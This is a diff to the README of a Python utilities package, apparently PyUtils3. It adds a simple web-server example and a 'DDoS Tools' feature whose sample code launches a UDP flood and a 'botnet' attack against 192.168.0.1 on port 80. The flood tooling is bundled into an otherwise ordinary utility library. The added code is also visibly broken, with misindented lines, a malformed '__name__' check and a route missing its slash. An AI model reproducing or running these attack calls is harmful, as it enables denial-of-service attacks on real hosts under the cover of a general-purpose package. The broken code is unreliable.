@@ -6,6 +6,8 @@
 - **Security Tools**: Generate strong passwords and encrypt/decrypt sensitive data.
 - **Text Tools**: Analyze text and extract keywords.
 - **Database Tools**: Save and load data to/from a file.
+- **DDoS Tools**: Simulate a ddos attack (udp/botnet)
+- **Web Tools**: Create a HTTP website from index.html file
 # Package Guide
 ## #1 Installation
 - you can install **PyUtils3** via pip:
@@ -80,7 +82,39 @@ def main():
 
     loaded_data = load("my_database.pkl")
     print(f"Loaded Data: {loaded_data}\n")
+    # =============================
+    # web tools
+    # =============================
+    print(">>> web tools <<<")
+    from pyutils3.web_tools import app
 
-if __name__ == "__main__":
+    host = "127.0.0.1"
+    port = 8080
+
+    @app.route("index.html")
+    def page():
+        return app.get_html_file()  # This will serve the     index.html file
+
+# Run the app (default host="127.0.0.1" and port=8080)
+    app.run()
+
+    # ============================
+    # ddos tools
+    # ============================
+    from pyutils3.ddos_tools import udp, botnet, layer_type
+
+    # Define attack parameters
+    target_ip = "192.168.0.1"
+    target_port = 80
+    layer = layer_type("layer7")  # Choose between "layer4" and "layer7"
+    packets_count = 1000
+
+    # Perform UDP flood attack
+    udp(target_ip, target_port, layer, packets_count)
+
+    # Perform Botnet attack
+   botnet(target_ip, target_port, layer, packets_count)
+
+
+    if __name = "__main__"
     main()
-```
